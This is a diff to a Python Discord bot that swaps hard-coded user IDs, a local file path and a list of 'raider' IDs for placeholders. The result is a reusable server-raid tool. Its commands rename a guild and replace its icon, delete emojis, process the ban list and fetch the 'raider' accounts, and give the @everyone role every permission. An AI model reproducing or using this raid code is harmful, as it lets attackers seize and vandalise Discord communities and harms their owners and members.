@@ -23,7 +23,7 @@ async def on_ready():
 @client.command()
 
 async def stop(ctx):
-   if ctx.message.author.id == 786937653311569940:
+   if ctx.message.author.id == "Your ID":
       await ctx.message.delete()
       await ctx.bot.logout()
       print (f"{client.user.name} has logged out successfully.")
@@ -31,9 +31,9 @@ async def stop(ctx):
 @client.command()
 
 async def alien(ctx):
-   if ctx.message.author.id == 786937653311569940:
+   if ctx.message.author.id == "Your ID":
     await ctx.message.delete()
-    with open('/Users/MatthewHa/code-ha/python/python/alien.jpeg', 'rb') as f:
+    with open('Your path to the image', 'rb') as f:
       icon = f.read()
     await ctx.guild.edit(name="Alien")
     await ctx.guild.edit(icon=icon)
@@ -70,12 +70,12 @@ async def alien(ctx):
        print(f"{emoji.name} Wasn't Deleted")
     banned_users = await guild.bans()
     for ban_entry in banned_users:
-      raider1 = '852532529076764672'
-      raider2 = '909100865971974244'
-      raider2 = '857900300345147432'
-      raider3 = '786937653311569940'
-      raider4 = '912018825829031997'
-      raider5 = '912018825829031997'
+      raider1 = 'ID'
+      raider2 = 'ID'
+      raider2 = 'ID'
+      raider3 = 'ID'
+      raider4 = 'ID'
+      raider5 = 'ID'
       user_fetch1 = await client.fetch_user(raider1)
       user_fetch2 = await client.fetch_user(raider2)
       user_fetch3 = await client.fetch_user(raider3)
@@ -119,7 +119,7 @@ async def clear(ctx):
         
 @client.command()
 async def sudo(ctx):
-    if ctx.message.author.id == 786937653311569940:
+    if ctx.message.author.id == "Your ID":
         await ctx.message.delete()
         role = discord.utils.get(ctx.guild.roles, name = "@everyone")
         await role.edit(permissions = Permissions.all())
